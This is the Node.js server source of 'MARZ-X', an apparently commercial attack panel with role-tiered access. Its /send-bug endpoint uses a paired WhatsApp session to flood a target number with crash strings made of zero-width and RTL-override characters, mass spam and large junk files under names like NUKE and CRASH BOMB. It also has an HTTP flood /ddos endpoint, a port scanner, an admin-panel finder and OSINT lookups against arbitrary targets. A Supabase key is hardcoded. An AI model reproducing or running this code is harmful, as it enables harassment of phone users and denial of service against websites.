const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore } = require('@whiskeysockets/baileys');
const QRCode = require('qrcode');
const { createClient } = require('@supabase/supabase-js');
const { Boom } = require('@hapi/boom');
const axios = require('axios');
const net = require('net');
const dns = require('dns');
const path = require('path');
const fs = require('fs');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// ============================================================
// KONFIGURASI SUPABASE
// ============================================================
const SUPABASE_URL = 'https://nxihknuzzmqbdcazikln.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_NnBJVtkGKDp1ZhLVYpxKXg_KMCK9EvO';
const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

// ============================================================
// SESSIONS PER USER
// ============================================================
const sessions = {};
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

// ============================================================
// FUNGSI WHATSAPP SOCKET (PER USER)
// ============================================================
async function getUserSocket(username, phoneNumber) {
    if (sessions[username] && sessions[username].isReady) {
        return sessions[username].sock;
    }

    const authFolder = path.join(__dirname, `auth_${username}`);
    if (!fs.existsSync(authFolder)) {
        fs.mkdirSync(authFolder, { recursive: true });
    }

    console.log(`[AUTH] ${username} menggunakan folder: ${authFolder}`);

    const { state, saveCreds } = await useMultiFileAuthState(authFolder);
    const sock = makeWASocket({
        printQRInTerminal: false,
        auth: state,
        browser: ['MARZ-X Bot', 'Chrome', '1.0.0']
    });

    const store = makeInMemoryStore({});
    store.bind(sock.ev);

    let pairingCode = null;
    let qrString = null;
    let isReady = false;
    let pairingAttempts = 0;

    setTimeout(async () => {
        if (!sock.authState.creds.registered) {
            try {
                console.log(`[PAIRING] Mencoba pairing untuk ${username}...`);
                const code = await sock.requestPairingCode(phoneNumber);
                pairingCode = code;
                pairingAttempts = 0;
                console.log(`[PAIRING] ${username} -> KODE: ${code}`);
            } catch (err) {
                console.error(`[ERROR] Pairing ${username}:`, err.message);
                pairingAttempts++;
                if (pairingAttempts < 3) {
                    console.log(`[PAIRING] Coba ulang dalam 3 detik... (${pairingAttempts}/3)`);
                    setTimeout(async () => {
                        try {
                            const code = await sock.requestPairingCode(phoneNumber);
                            pairingCode = code;
                            console.log(`[PAIRING] ${username} -> KODE: ${code}`);
                        } catch (e) {
                            console.error(`[ERROR] Pairing ulang ${username}:`, e.message);
                        }
                    }, 3000);
                }
            }
        } else {
            console.log(`[AUTH] ${username} sudah memiliki kredensial, skip pairing.`);
        }
    }, 2000);

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            qrString = qr;
            console.log(`[QR] ${username} QR tersedia`);
        }
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect?.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log(`[RECONNECT] ${username} mencoba reconnect...`);
                getUserSocket(username, phoneNumber);
            } else {
                console.log(`[LOGOUT] ${username} logged out`);
                isReady = false;
                delete sessions[username];
            }
        } else if (connection === 'open') {
            console.log(`[READY] ${username} siap!`);
            isReady = true;
            pairingCode = null;
            qrString = null;
        }
    });

    sessions[username] = {
        sock: sock,
        isReady: isReady,
        pairingCode: pairingCode,
        qrString: qrString,
        phoneNumber: phoneNumber
    };

    const interval = setInterval(() => {
        if (sessions[username]) {
            sessions[username].isReady = isReady;
            sessions[username].pairingCode = pairingCode;
            sessions[username].qrString = qrString;
        } else {
            clearInterval(interval);
        }
    }, 1000);

    return sock;
}

// ============================================================
// FUNGSI UPDATE STATISTIK SUPABASE
// ============================================================
async function updateUserStats(username, type, target, detail) {
    if (!username) return;
    try {
        const { data: stats } = await supabase
            .from('users_stats')
            .select('bug_count, tool_count')
            .eq('username', username)
            .single();

        let bugCount = stats?.bug_count || 0;
        let toolCount = stats?.tool_count || 0;
        if (type === 'BUG') bugCount += 1;
        else if (type === 'TOOL') toolCount += 1;

        await supabase
            .from('users_stats')
            .upsert({
                username: username,
                bug_count: bugCount,
                tool_count: toolCount,
                updated_at: new Date().toISOString()
            }, { onConflict: 'username' });

        await supabase
            .from('activity_logs')
            .insert({
                username: username,
                type: type,
                detail: `${detail}\nTarget: ${target}\nJam: ${new Date().toLocaleString('id-ID', { hour12: false })}`,
                status: 'DONE',
                timestamp: new Date().toISOString()
            });

    } catch (err) {
        console.error('[ERROR] Supabase:', err);
    }
}

// ============================================================
// FUNGSI CEK AKSES TOOLS
// ============================================================
async function checkToolAccess(username, toolName) {
    const { data: userData, error } = await supabase
        .from('users')
        .select('role')
        .eq('username', username)
        .single();
    if (error || !userData) return false;
    const role = userData.role;
    const allowedTools = {
        member: ['ddos', 'portscan'],
        admin: ['ddos', 'portscan', 'osint', 'adminfinder'],
        owner: ['ddos', 'portscan', 'osint', 'adminfinder', 'reverseip', 'webscraper'],
        master: ['ddos', 'portscan', 'osint', 'adminfinder', 'reverseip', 'webscraper']
    };
    return allowedTools[role] && allowedTools[role].includes(toolName);
}

// ============================================================
// MIDDLEWARE CEK MASTER
// ============================================================
async function checkMaster(req, res, next) {
    const username = req.body.username || req.query.username;
    if (!username) {
        return res.status(401).json({ error: 'Unauthorized: username required' });
    }
    const { data: user, error } = await supabase
        .from('users')
        .select('role')
        .eq('username', username)
        .single();

    if (error || !user) {
        return res.status(401).json({ error: 'User not found' });
    }
    if (user.role !== 'master') {
        return res.status(403).json({ error: 'Forbidden: only master can access this endpoint' });
    }
    next();
}

// ============================================================
// 1. PAIRING
// ============================================================
app.post('/pairing-code', async (req, res) => {
    const { username, phoneNumber } = req.body;
    if (!username || !phoneNumber) {
        return res.status(400).json({ error: 'username dan phoneNumber wajib diisi' });
    }

    const cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
    if (!cleanNumber.startsWith('62') && !cleanNumber.startsWith('8')) {
        return res.status(400).json({ error: 'Nomor harus diawali 62 atau 8 (contoh: 6281234567890)' });
    }

    const finalNumber = cleanNumber.startsWith('62') ? cleanNumber : '62' + cleanNumber;
    console.log(`[PAIRING] Request dari ${username} untuk nomor ${finalNumber}`);

    if (sessions[username] && sessions[username].isReady) {
        return res.json({ status: 'ready', message: 'Sudah terhubung', code: null });
    }

    await getUserSocket(username, finalNumber);

    let attempts = 0;
    const maxAttempts = 30;
    while (attempts < maxAttempts) {
        const session = sessions[username];
        if (session && session.pairingCode) {
            console.log(`[PAIRING] Berhasil mendapatkan kode untuk ${username}: ${session.pairingCode}`);
            return res.json({
                status: 'disconnected',
                message: 'Masukkan kode 8 digit ke WhatsApp > Perangkat Tertaut > Tautkan Perangkat dengan Nomor Telepon',
                code: session.pairingCode,
                expiresIn: '60 detik'
            });
        }
        await delay(500);
        attempts++;
    }

    console.error(`[PAIRING] Gagal mendapatkan kode untuk ${username} setelah ${maxAttempts} percobaan.`);
    const session = sessions[username];
    if (session && session.qrString) {
        return res.json({
            status: 'disconnected',
            message: 'Gagal generate kode pairing. Coba gunakan QR Code atau ulangi.',
            code: null,
            qrAvailable: true
        });
    }

    return res.json({
        status: 'disconnected',
        message: 'Gagal generate kode. Pastikan nomor benar dan coba lagi.',
        code: null
    });
});

// ============================================================
// 2. QR CODE
// ============================================================
app.get('/qr/:username', async (req, res) => {
    const { username } = req.params;
    const session = sessions[username];
    if (!session) return res.status(404).json({ error: 'User belum terdaftar' });
    if (session.isReady) return res.status(400).json({ error: 'Sudah terhubung' });
    if (!session.qrString) return res.status(404).json({ error: 'QR belum tersedia' });
    try {
        const qrBuffer = await QRCode.toBuffer(session.qrString, { type: 'png', width: 300, margin: 2 });
        res.setHeader('Content-Type', 'image/png');
        res.send(qrBuffer);
    } catch (err) {
        res.status(500).json({ error: 'Gagal generate QR' });
    }
});

// ============================================================
// 3. STATUS
// ============================================================
app.get('/status', (req, res) => {
    let anyReady = false;
    for (const key in sessions) {
        if (sessions[key].isReady) {
            anyReady = true;
            break;
        }
    }
    res.json({
        status: anyReady ? 'ready' : 'disconnected',
        message: anyReady ? 'Bot WhatsApp siap digunakan' : 'Belum ada user yang pairing',
        sessions: Object.keys(sessions).length
    });
});

app.get('/status/:username', (req, res) => {
    const { username } = req.params;
    const session = sessions[username];
    if (!session) return res.json({ status: 'not_found', message: 'Belum register' });
    res.json({
        status: session.isReady ? 'ready' : 'disconnected',
        message: session.isReady ? 'Siap digunakan' : 'Belum pairing',
        phoneNumber: session.phoneNumber,
        pairingCode: session.pairingCode,
        qrAvailable: !!session.qrString
    });
});

// ============================================================
// 4. SEND BUG
// ============================================================
app.post('/send-bug', async (req, res) => {
    const { targetNumber, effect, username, count = 0 } = req.body;
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });
    const session = sessions[username];
    if (!session || !session.isReady || !session.sock) {
        return res.status(503).json({ error: `User ${username} belum terhubung.` });
    }
    if (!targetNumber) return res.status(400).json({ error: 'Nomor target wajib diisi' });

    const { data: userData, error: userError } = await supabase
        .from('users')
        .select('role')
        .eq('username', username)
        .single();

    if (userError || !userData) {
        return res.status(401).json({ error: 'User tidak ditemukan' });
    }

    const role = userData.role;
    const allowedEffects = {
        member: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'RESTART HARD', 'FC INSTANT'],
        admin: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'FC INSTANT', 'RESTART HARD', 'BOOTLOOP HARD', 'NUKE', 'VIRTEX_LEGACY'],
        owner: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'FC INSTANT', 'RESTART HARD', 'BOOTLOOP HARD', 'NUKE', 'VIRTEX_LEGACY'],
        master: ['DELAY HARD', 'BLANK HARD', 'FREEZE HARD', 'FC INSTANT', 'RESTART HARD', 'BOOTLOOP HARD', 'NUKE', 'VIRTEX_LEGACY', 'MEGA SPAM', 'CRASH BOMB']
    };

    if (!allowedEffects[role] || !allowedEffects[role].includes(effect)) {
        return res.status(403).json({
            error: `Role ${role} tidak memiliki akses ke efek "${effect}"`,
            allowed: allowedEffects[role] || []
        });
    }

    const sock = session.sock;
    const chatId = targetNumber.includes('@s.whatsapp.net') ? targetNumber : `${targetNumber}@s.whatsapp.net`;
    console.log(`[BUG] ${username} (${role}): ${effect} -> ${targetNumber}`);

    try {
        const send = async (text) => await sock.sendMessage(chatId, { text });

        // ============================================================
        // 1. DELAY HARD
        // ============================================================
        if (effect === 'DELAY HARD') {
            const bomb = 'A'.repeat(5000) + '\u200B'.repeat(2000) + '🔥'.repeat(3000) + '\n'.repeat(100) + '💥'.repeat(300);
            await send(bomb.slice(0, 5000));
            await delay(50);
            await send(bomb.slice(5000));
            for (let i = 0; i < 130; i++) {
                await send(`[${i+1}/130] ⚡SPAM!`);
                await delay(5);
            }
            for (let i = 0; i < 30; i++) {
                const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
                await sock.sendMessage(chatId, {
                    document: buffer,
                    mimetype: 'application/octet-stream',
                    fileName: `file_${i+1}.bin`,
                    caption: `📁 FILE ${i+1}/30`
                });
                await delay(30);
            }
        }

        // ============================================================
        // 2. BLANK HARD
        // ============================================================
        else if (effect === 'BLANK HARD') {
            for (let loop = 0; loop < 2; loop++) {
                for (let i = 0; i < 100; i++) {
                    await send('\u200B'.repeat(1500) + '‎‏‎‏'.repeat(300) + '​'.repeat(800) + ' '.repeat(200));
                    await delay(2);
                }
                const bomb = 'A'.repeat(15000) + '\u200B'.repeat(8000) + '🔥'.repeat(7000) + '\n'.repeat(200) + '💥'.repeat(500) + '\u202E'.repeat(3000);
                await send(bomb.slice(0, 10000));
                await delay(50);
                await send(bomb.slice(10000, 20000));
                await delay(50);
                await send(bomb.slice(20000));
                for (let i = 0; i < 200; i++) {
                    await send(`[${i+1}/200] 💀`);
                    await delay(1);
                }
                for (let i = 0; i < 20; i++) {
                    const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
                    await sock.sendMessage(chatId, {
                        document: buffer,
                        mimetype: 'application/octet-stream',
                        fileName: `file_${i+1}.bin`,
                        caption: `📁 FILE ${i+1}/20`
                    });
                    await delay(30);
                }
            }
        }

        // ============================================================
        // 3. FREEZE HARD
        // ============================================================
        else if (effect === 'FREEZE HARD') {
            for (let i = 0; i < 200; i++) {
                await send('.');
                await delay(2);
                if (i % 50 === 0) {
                    await send('A'.repeat(500) + '🔥'.repeat(100) + '\u200B'.repeat(200));
                }
            }
        }

        // ============================================================
        // 4. FC INSTANT
        // ============================================================
        else if (effect === 'FC INSTANT') {
            for (let loop = 0; loop < 2; loop++) {
                await send('*_~'.repeat(500) + 'TEKS RUSAK'.repeat(200) + '~_*'.repeat(500));
                await delay(50);
                await send('ဪ'.repeat(5000));
                await delay(50);
                await send('🔥'.repeat(3000) + '\u202E'.repeat(1000));
                await delay(50);
                for (let i = 0; i < 100; i++) {
                    await send(`[FC] ${i+1}/100`);
                    await delay(2);
                }
            }
        }

        // ============================================================
        // 5. RESTART HARD
        // ============================================================
        else if (effect === 'RESTART HARD') {
            for (let i = 0; i < 30; i++) {
                const buffer = Buffer.alloc(2 * 1024 * 1024, `${i}`.repeat(500).padEnd(2*1024*1024, 'X'));
                await sock.sendMessage(chatId, {
                    document: buffer,
                    mimetype: 'application/octet-stream',
                    fileName: `file_${i+1}.bin`,
                    caption: `📁 FILE ${i+1}/30`
                });
                await delay(30);
                if (i % 5 === 0) {
                    await send(`[RESTART] ${i+1}/30`);
                }
            }
        }

        // ============================================================
        // 6. BOOTLOOP HARD
        // ============================================================
        else if (effect === 'BOOTLOOP HARD') {
            for (let loop = 0; loop < 2; loop++) {
                for (let i = 0; i < 50; i++) {
                    await send('[LOOP] ' + '\u200B'.repeat(500) + '🔥'.repeat(50) + '\u202E'.repeat(20));
                    await delay(5);
                    if (i % 10 === 0) {
                        const buffer = Buffer.alloc(1 * 1024 * 1024, `X`.repeat(500).padEnd(1024*1024, 'Y'));
                        await sock.sendMessage(chatId, {
                            document: buffer,
                            mimetype: 'application/octet-stream',
                            fileName: `loop_${i}.bin`,
                            caption: `📁 LOOP ${i+1}`
                        });
                    }
                }
                const bomb = 'A'.repeat(5000) + '\u200B'.repeat(3000) + '🔥'.repeat(2000);
                await send(bomb);
            }
        }

        // ============================================================
        // 7. NUKE
        // ============================================================
        else if (effect === 'NUKE') {
            for (let loop = 0; loop < 2; loop++) {
                const bomb = 'A'.repeat(8000) + '\u200B'.repeat(4000) + '🔥'.repeat(3000) + '\n'.repeat(150) + '💥'.repeat(500);
                await send(bomb.slice(0, 7500));
                await delay(50);
                await send(bomb.slice(7500));
                for (let i = 0; i < 250; i++) {
                    await send(`[NUKE ${i+1}/250] 💀`);
                    await delay(2);
                }
                for (let i = 0; i < 50; i++) {
                    const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
                    await sock.sendMessage(chatId, {
                        document: buffer,
                        mimetype: 'application/octet-stream',
                        fileName: `file_${i+1}.bin`,
                        caption: `📁 FILE ${i+1}/50`
                    });
                    await delay(20);
                }
            }
        }

        // ============================================================
        // 8. VIRTEX_LEGACY
        // ============================================================
        else if (effect === 'VIRTEX_LEGACY') {
            const chars = '\u202E\u202D\u200B\u200C\u200D\uFEFF\u061C\u2066\u2067\u2068\u2069'.repeat(1000);
            await send(chars + 'SERANGAN VIRTEX'.repeat(200) + chars);
            await delay(50);
            await send('ဪ'.repeat(10000));
            await delay(50);
            await send('‍'.repeat(8000) + '💀'.repeat(500));
            await delay(50);
            await send('X'.repeat(5000) + '\u202E'.repeat(2000));
        }

        // ============================================================
        // 9. MEGA SPAM
        // ============================================================
        else if (effect === 'MEGA SPAM') {
            const msgs = ['⚠️ BANJIR!', '💥 SPAM!', '🔥 OVERLOAD!', '💀 CRASH!', '👾 VIRUS!', '📱 LEMOT!', '🔴 LOCKED!'];
            for (let i = 0; i < 200; i++) {
                await send(`${msgs[i % msgs.length]} [${i+1}/200]` + '!'.repeat(i % 15 + 1));
                await delay(1);
                if (i % 50 === 0) {
                    await send('A'.repeat(3000) + '\u200B'.repeat(2000));
                }
            }
            for (let i = 0; i < 10; i++) {
                const buffer = Buffer.alloc(1 * 1024 * 1024, `${i}`.repeat(500).padEnd(1024*1024, 'X'));
                await sock.sendMessage(chatId, {
                    document: buffer,
                    mimetype: 'application/octet-stream',
                    fileName: `file_${i+1}.bin`,
                    caption: `📁 FILE ${i+1}/10`
                });
                await delay(30);
            }
        }

        // ============================================================
        // 10. CRASH BOMB
        // ============================================================
        else if (effect === 'CRASH BOMB') {
            for (let loop = 0; loop < 2; loop++) {
                const bomb = 'A'.repeat(10000) + '\u200B'.repeat(5000) + '🔥'.repeat(5000) + '\n'.repeat(200) + '💥'.repeat(400) + '\u202E'.repeat(3000);
                await send(bomb.slice(0, 7000));
                await delay(50);
                await send(bomb.slice(7000, 14000));
                await delay(50);
                await send(bomb.slice(14000));
                for (let i = 0; i < 50; i++) {
                    await send(`[CRASH] ${i+1}/50`);
                    await delay(2);
                }
            }
        }

        else {
            return res.status(400).json({ error: `Efek "${effect}" tidak dikenal` });
        }

        await updateUserStats(username, 'BUG', targetNumber, `Efek: ${effect}`);
        res.json({ success: true, effect, target: targetNumber, message: `✅ Efek "${effect}" terkirim ke ${targetNumber}` });

    } catch (error) {
        console.error('[ERROR]', error);
        res.status(500).json({ error: error.message || 'Gagal kirim bug' });
    }
});

// ============================================================
// 5. DDOS
// ============================================================
app.post('/ddos', async (req, res) => {
    const { url, username, count = 100, method = 'GET' } = req.body;
    if (!url) return res.status(400).json({ error: 'URL target wajib diisi' });
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });

    const hasAccess = await checkToolAccess(username, 'ddos');
    if (!hasAccess) {
        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
    }

    console.log(`[DDOS] ${username} -> ${url} (${count} request)`);

    try {
        const promises = [];
        let success = 0, failed = 0;
        const start = Date.now();
        const maxReq = Math.min(count, 500);

        for (let i = 0; i < maxReq; i++) {
            const p = axios({
                method: method,
                url: url,
                timeout: 5000,
                validateStatus: () => true
            }).then(() => success++).catch(() => failed++);
            promises.push(p);
            if (i % 50 === 0) await delay(10);
        }

        await Promise.all(promises);
        const duration = ((Date.now() - start) / 1000).toFixed(2);

        await updateUserStats(username, 'TOOL', url, `DDoS HTTP (${method}) - ${success} sukses, ${failed} gagal`);

        res.json({
            success: true,
            target: url,
            total: maxReq,
            success,
            failed,
            duration: `${duration} detik`,
            message: `✅ DDoS selesai. ${success} berhasil, ${failed} gagal.`
        });

    } catch (error) {
        console.error('[DDOS ERROR]', error);
        res.status(500).json({ error: error.message || 'Gagal menjalankan DDoS' });
    }
});

// ============================================================
// 6. PORT SCANNER
// ============================================================
app.post('/tools/portscan', async (req, res) => {
    const { host, username, ports } = req.body;
    if (!host) return res.status(400).json({ error: 'Host wajib diisi' });
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });

    const hasAccess = await checkToolAccess(username, 'portscan');
    if (!hasAccess) {
        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
    }

    const portList = ports ? ports.split(',').map(p => parseInt(p.trim())) : [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,6379,8080,8443,27017];
    console.log(`[PORTSCAN] ${username} -> ${host} (${portList.length} ports)`);

    try {
        const results = [];
        const timeout = 2000;

        for (const port of portList) {
            const start = Date.now();
            const result = await new Promise((resolve) => {
                const socket = new net.Socket();
                const timer = setTimeout(() => {
                    socket.destroy();
                    resolve({ port, status: 'closed', time: Date.now() - start });
                }, timeout);
                socket.on('connect', () => {
                    clearTimeout(timer);
                    socket.destroy();
                    resolve({ port, status: 'open', time: Date.now() - start });
                });
                socket.on('error', () => {
                    clearTimeout(timer);
                    resolve({ port, status: 'filtered', time: Date.now() - start });
                });
                socket.connect(port, host);
            });
            results.push(result);
        }

        const openPorts = results.filter(r => r.status === 'open');
        const summary = `Host: ${host}, Open: ${openPorts.length}, Total: ${results.length}`;

        await updateUserStats(username, 'TOOL', host, `Port Scan: ${summary}`);

        res.json({
            success: true,
            host,
            results: results,
            openPorts: openPorts.map(r => r.port),
            summary,
            message: `✅ Port scan selesai. ${openPorts.length} port terbuka.`
        });

    } catch (error) {
        console.error('[PORTSCAN ERROR]', error);
        res.status(500).json({ error: error.message || 'Gagal scan port' });
    }
});

// ============================================================
// 7. REVERSE IP
// ============================================================
app.post('/tools/reverseip', async (req, res) => {
    const { ip, username } = req.body;
    if (!ip) return res.status(400).json({ error: 'IP wajib diisi' });
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });

    const hasAccess = await checkToolAccess(username, 'reverseip');
    if (!hasAccess) {
        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
    }

    try {
        const domain = await new Promise((resolve, reject) => {
            dns.reverse(ip, (err, hostnames) => {
                if (err) reject(err);
                else resolve(hostnames);
            });
        });

        await updateUserStats(username, 'TOOL', ip, `Reverse IP: ${domain.join(', ')}`);

        res.json({
            success: true,
            ip: ip,
            domain: domain,
            message: `✅ Reverse IP berhasil: ${domain.join(', ')}`
        });

    } catch (error) {
        console.error('[REVERSE IP ERROR]', error);
        res.status(500).json({ error: error.message || 'Gagal reverse IP' });
    }
});

// ============================================================
// 8. OSINT LOOKUP
// ============================================================
app.post('/tools/osint', async (req, res) => {
    const { target, username } = req.body;
    if (!target) return res.status(400).json({ error: 'Target (IP atau nomor HP) wajib diisi' });
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });

    const hasAccess = await checkToolAccess(username, 'osint');
    if (!hasAccess) {
        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
    }

    const isIP = /^(\d{1,3}\.){3}\d{1,3}$/.test(target);
    const isPhone = /^(\+?\d{10,15})$/.test(target);

    try {
        let result = {};
        if (isIP) {
            const ipRes = await axios.get(`https://ipinfo.io/${target}/json`);
            result = { type: 'IP', ip: target, data: ipRes.data };
        } else if (isPhone) {
            result = {
                type: 'Phone',
                number: target,
                data: { country: 'Indonesia (estimasi)', carrier: 'Telkomsel / Indosat / XL (estimasi)' },
                note: 'Informasi nomor HP hanya perkiraan, gunakan API berbayar untuk akurasi.'
            };
        } else {
            return res.status(400).json({ error: 'Target harus berupa IP atau nomor HP' });
        }

        await updateUserStats(username, 'TOOL', target, `OSINT Lookup: ${JSON.stringify(result)}`);
        res.json({ success: true, target, result });
    } catch (error) {
        console.error('[OSINT ERROR]', error);
        res.status(500).json({ error: error.message || 'Gagal melakukan OSINT lookup' });
    }
});

// ============================================================
// 9. ADMIN FINDER
// ============================================================
app.post('/tools/adminfinder', async (req, res) => {
    const { url, username } = req.body;
    if (!url) return res.status(400).json({ error: 'URL website wajib diisi' });
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });

    const hasAccess = await checkToolAccess(username, 'adminfinder');
    if (!hasAccess) {
        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
    }

    const adminPaths = [
        'admin', 'administrator', 'wp-admin', 'login', 'admin/login',
        'admin.php', 'dashboard', 'cp', 'cpanel', 'admin_area',
        'panel', 'backend', 'auth', 'signin', 'log-in'
    ];

    const found = [];
    const baseUrl = url.endsWith('/') ? url.slice(0, -1) : url;

    for (const path of adminPaths) {
        try {
            const testUrl = `${baseUrl}/${path}`;
            const response = await axios.get(testUrl, { timeout: 3000, validateStatus: () => true });
            if (response.status === 200) {
                found.push({ path, url: testUrl, status: 200 });
            } else if (response.status === 401 || response.status === 403) {
                found.push({ path, url: testUrl, status: response.status, note: 'Memerlukan autentikasi' });
            }
        } catch (e) {}
    }

    await updateUserStats(username, 'TOOL', url, `Admin Finder: ${found.length} ditemukan`);
    res.json({
        success: true,
        url: baseUrl,
        found: found,
        total: found.length,
        message: `✅ Admin finder selesai. ${found.length} path ditemukan.`
    });
});

// ============================================================
// 10. WEB SCRAPER
// ============================================================
app.post('/tools/webscraper', async (req, res) => {
    const { url, username } = req.body;
    if (!url) return res.status(400).json({ error: 'URL website wajib diisi' });
    if (!username) return res.status(400).json({ error: 'Username wajib diisi' });

    const hasAccess = await checkToolAccess(username, 'webscraper');
    if (!hasAccess) {
        return res.status(403).json({ error: 'Role Anda tidak memiliki akses ke tool ini' });
    }

    try {
        const response = await axios.get(url, { timeout: 10000 });
        const html = response.data;

        const titleMatch = html.match(/<title>(.*?)<\/title>/i);
        const title = titleMatch ? titleMatch[1] : 'Tidak ditemukan';

        const descMatch = html.match(/<meta\s+name="description"\s+content="(.*?)"/i);
        const description = descMatch ? descMatch[1] : 'Tidak ditemukan';

        const links = html.match(/<a\s+href="(.*?)"/gi)?.map(l => l.match(/href="(.*?)"/)[1]) || [];
        const sampleLinks = links.slice(0, 20);

        await updateUserStats(username, 'TOOL', url, `Web Scraper: ${title}`);

        res.json({
            success: true,
            url,
            title,
            description,
            totalLinks: links.length,
            sampleLinks,
            message: `✅ Web scraper selesai. Ditemukan ${links.length} link.`
        });

    } catch (error) {
        console.error('[WEB SCRAPER ERROR]', error);
        res.status(500).json({ error: error.message || 'Gagal mengambil konten website' });
    }
});

// ============================================================
// 11. MANAGE USER – HANYA MASTER
// ============================================================
app.get('/users', checkMaster, async (req, res) => {
    try {
        const { data: users, error } = await supabase
            .from('users')
            .select('username, role, active, permanent, expired, created_by')
            .order('username');

        if (error) throw error;
        res.json({ success: true, users });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/add-user', checkMaster, async (req, res) => {
    const { username, password, role = 'member', expired = null, created_by } = req.body;
    if (!username || !password) {
        return res.status(400).json({ error: 'username dan password wajib diisi' });
    }

    try {
        const { data: existing } = await supabase
            .from('users')
            .select('username')
            .eq('username', username)
            .single();

        if (existing) {
            return res.status(400).json({ error: 'Username sudah ada' });
        }

        const crypto = require('crypto');
        const hash = crypto.createHash('sha256').update(password).digest('hex');

        const newUser = {
            username,
            password: hash,
            role,
            active: true,
            permanent: !expired,
            expired: expired || null,
            created_by: created_by || req.body.username
        };

        const { data, error } = await supabase.from('users').insert(newUser).select();
        if (error) throw error;

        res.json({ success: true, user: data[0] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.put('/edit-user/:username', checkMaster, async (req, res) => {
    const targetUsername = req.params.username;
    const { role, active, permanent, expired } = req.body;

    if (!role && active === undefined && permanent === undefined && expired === undefined) {
        return res.status(400).json({ error: 'Tidak ada field yang diupdate' });
    }

    try {
        const updateData = {};
        if (role) updateData.role = role;
        if (active !== undefined) updateData.active = active;
        if (permanent !== undefined) updateData.permanent = permanent;
        if (expired !== undefined) updateData.expired = expired;

        const { data, error } = await supabase
            .from('users')
            .update(updateData)
            .eq('username', targetUsername)
            .select();

        if (error) throw error;
        if (!data || data.length === 0) {
            return res.status(404).json({ error: 'User tidak ditemukan' });
        }
        res.json({ success: true, user: data[0] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.delete('/delete-user/:username', checkMaster, async (req, res) => {
    const targetUsername = req.params.username;
    if (targetUsername === req.body.username) {
        return res.status(400).json({ error: 'Tidak bisa hapus diri sendiri' });
    }

    try {
        const { error } = await supabase
            .from('users')
            .delete()
            .eq('username', targetUsername);

        if (error) throw error;
        res.json({ success: true, message: `User ${targetUsername} dihapus` });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ============================================================
// ROOT
// ============================================================
app.get('/', (req, res) => {
    res.json({
        name: 'MARZ-X Backend',
        version: '3.0.0',
        status: 'online',
        nodeVersion: process.version,
        roles: {
            member: '5 efek bug, 2 tools (ddos, portscan)',
            admin: '8 efek bug, 4 tools (+ osint, adminfinder)',
            owner: '8 efek bug, 6 tools (semua)',
            master: '10 efek bug, 6 tools (semua) + manage user'
        },
        endpoints: {
            whatsapp: {
                pairing: 'POST /pairing-code {username, phoneNumber}',
                qr: 'GET /qr/:username',
                status: 'GET /status',
                statusUser: 'GET /status/:username',
                sendBug: 'POST /send-bug {username, targetNumber, effect}'
            },
            ddos: { httpFlood: 'POST /ddos {username, url, count, method}' },
            tools: {
                portScan: 'POST /tools/portscan {username, host, ports}',
                reverseIp: 'POST /tools/reverseip {username, ip}',
                osint: 'POST /tools/osint {username, target}',
                adminFinder: 'POST /tools/adminfinder {username, url}',
                webScraper: 'POST /tools/webscraper {username, url}'
            },
            admin: {
                users: 'GET /users?username=master (only master)',
                addUser: 'POST /add-user (only master)',
                editUser: 'PUT /edit-user/:username (only master)',
                deleteUser: 'DELETE /delete-user/:username (only master)'
            }
        }
    });
});

// ============================================================
// JALANKAN SERVER
// ============================================================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[SERVER] MARZ-X Backend running on port ${PORT}`);
    console.log(`[NODE] Version: ${process.version}`);
    console.log(`[ROUTES] /status, /pairing-code, /send-bug, /ddos, /tools/*, /users, /add-user, /edit-user, /delete-user`);
    console.log(`[ADMIN] Hanya master yang bisa manage user`);
});
